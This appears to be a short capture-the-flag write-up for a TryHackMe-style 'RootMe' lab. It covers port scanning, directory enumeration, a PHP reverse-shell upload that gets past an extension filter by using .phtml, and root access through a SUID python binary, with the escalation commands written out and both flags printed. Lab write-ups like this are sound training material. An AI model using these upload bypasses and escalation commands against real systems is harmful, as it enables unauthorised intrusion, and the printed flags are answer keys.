## RootMe

IP - 10.10.116.27

Port scan - 
```
Open ports - 
22
80
```
nmap -sV -sC 10.10.116.27
```

```
Since web server is running on port 80, browsing webpage and checking source code reveals nothing interesting.
Directoru enumeration - 
```
[00:18:12] 301 -  309B  - /js  ->  http://10.10.116.27/js/                 
[00:18:13] 403 -  277B  - /.ht_wsr.txt                                     
[00:18:13] 403 -  277B  - /.htaccess.bak1                                  
[00:18:13] 403 -  277B  - /.htaccess.sample
[00:18:13] 403 -  277B  - /.htaccess.orig
[00:18:13] 403 -  277B  - /.htaccess.save
[00:18:13] 403 -  277B  - /.htaccess_orig
[00:18:13] 403 -  277B  - /.htaccess_extra
[00:18:13] 403 -  277B  - /.htaccessBAK
[00:18:13] 403 -  277B  - /.htaccessOLD2
[00:18:13] 403 -  277B  - /.htaccessOLD
[00:18:13] 403 -  277B  - /.htaccess_sc
[00:18:13] 403 -  277B  - /.httr-oauth
[00:18:13] 403 -  277B  - /.htm                                            
[00:18:13] 403 -  277B  - /.htpasswds                                      
[00:18:13] 403 -  277B  - /.htpasswd_test
[00:18:13] 403 -  277B  - /.html                                           
[00:18:15] 403 -  277B  - /.php                                            
[00:18:42] 301 -  310B  - /css  ->  http://10.10.116.27/css/                
[00:18:50] 200 -  616B  - /index.php                                        
[00:18:50] 200 -  616B  - /index.php/login/                                 
[00:18:51] 200 -  958B  - /js/                                              
[00:18:59] 301 -  312B  - /panel  ->  http://10.10.116.27/panel/            
[00:18:59] 200 -  732B  - /panel/                                           
[00:19:06] 403 -  277B  - /server-status                                    
[00:19:06] 403 -  277B  - /server-status/                                   
[00:19:13] 200 -  743B  - /uploads/                                         
[00:19:13] 301 -  314B  - /uploads  ->  http://10.10.116.27/uploads/
```
2 interesting directories - panel, uploads

browsing over shows an upload page in /panel and directory exposure of uploads from /panel in /uploads directory

modified and uploaded a php reverse shell, but failed. some kind of checks are implemented...tried .phtml extension and it worked!

We land as www-data as usual...and browsin to web root in /var/www/ directory we find first flag
```
html  user.txt
bash-4.4$ cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}
```

Uploaded linpeas script to check any misconfigurations and voila! found that python is set as SUID

checking in gtfobins,
```
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
```
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root

```
We land as root!
```
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
PWNED!